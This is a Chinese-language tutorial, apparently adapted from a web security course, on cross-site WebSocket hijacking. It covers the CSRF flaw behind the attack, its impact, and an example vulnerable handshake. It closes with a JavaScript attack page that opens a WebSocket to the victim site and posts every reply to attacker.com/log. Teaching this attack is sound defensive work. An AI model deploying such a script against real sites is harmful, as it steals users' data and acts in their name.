# 跨站点 WebSocket 劫持

在本节中，我们将解释什么是跨站点 WebSocket 劫持（CSWSH），描述其危害影响，并详细说明如何实施一次跨站点 WebSocket 劫持攻击。

## 什么是跨站点 WebSocket 劫持？

跨站点 WebSocket 劫持（也称跨源 WebSocket 劫持）本质上是 WebSocket 握手过程中存在的一个跨站请求伪造（CSRF）漏洞。当 WebSocket 握手请求仅依赖 HTTP Cookie 进行会话管理，且不包含任何 CSRF 令牌或其他不可预测的值时，就会出现该漏洞。

攻击者可以在自己控制的域上创建一个恶意网页，从而与存在漏洞的应用程序建立跨域 WebSocket 连接。应用程序会以受害用户与该应用程序的会话上下文来处理该连接。

随后，攻击者页面可以通过该连接向服务器发送任意消息，并读取从服务器接收到的消息内容。这意味着，与普通的 CSRF 不同，攻击者获得了与被攻陷应用程序的双向交互能力。

## 跨站点 WebSocket 劫持的影响是什么？

一次成功的跨站点 WebSocket 劫持攻击通常使攻击者能够：

- **冒充受害用户执行未授权操作。** 与普通 CSRF 一样，攻击者可以向服务端应用程序发送任意消息。如果应用程序使用客户端生成的 WebSocket 消息来执行敏感操作，攻击者就可以跨域生成相应的消息并触发这些操作。

- **检索受害用户可访问的敏感数据。** 与普通 CSRF 不同，跨站点 WebSocket 劫持使攻击者能够通过被劫持的 WebSocket 与存在漏洞的应用程序进行双向交互。如果应用程序使用服务端生成的 WebSocket 消息向用户返回敏感数据，攻击者就可以拦截这些消息并捕获受害用户的数据。

## 如何实施跨站点 WebSocket 劫持攻击

由于跨站点 WebSocket 劫持攻击本质上是对 WebSocket 握手的 CSRF 攻击，因此实施攻击的第一步是审查应用程序执行的 WebSocket 握手，并确定它们是否具备 CSRF 防护。

从 [CSRF 攻击的一般条件](https://portswigger.net/web-security/csrf#how-does-csrf-work) 来看，通常需要找到一个仅依赖 HTTP Cookie 进行会话管理，并且不在请求参数中使用任何令牌或其他不可预测值的握手消息。

例如，以下 WebSocket 握手请求很可能存在 CSRF 漏洞，因为唯一的会话令牌是通过 Cookie 传输的：

```http
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

> **注意**
> `Sec-WebSocket-Key` 头包含一个随机值，用于防止缓存代理导致的错误，并不用于身份验证或会话管理。

如果 WebSocket 握手请求存在 CSRF 漏洞，攻击者的网页可以执行跨域请求，在存在漏洞的站点上打开一个 WebSocket。攻击的后续走向完全取决于应用程序的逻辑及其使用 WebSocket 的方式。攻击可能涉及：

- 发送 WebSocket 消息，代表受害用户执行未授权操作。
- 发送 WebSocket 消息以检索敏感数据。（使用应用程序的功能字符串）
- 有时，只需等待接收包含敏感数据的传入消息。（事件监听器，读取事件数据）


以下脚本将托管在 `attacker.com`。一旦加载到受害者的浏览器中，它将建立与 `vulnerable.com` 的 WebSocket 连接。对于 `vulnerable.com`，消息似乎来自 `attacker.com`，因为它没有验证请求的来源。当 `vulnerable.com` 响应请求时，脚本将数据记录到 `attacker.com/logs`。

**代码：**
```javascript
<script>
    (function() {
        var ws = new WebSocket("wss://vulnerable.com/chat");
        ws.onopen = function() {
            ws.send("malicious data");
        };
        ws.onmessage = function(event) {
            // 使用 XHR 将接收到的数据发送到攻击者的服务器。
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "https://attacker.com/log", true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify({ data: event.data }));
        };
    })();
</script>
```
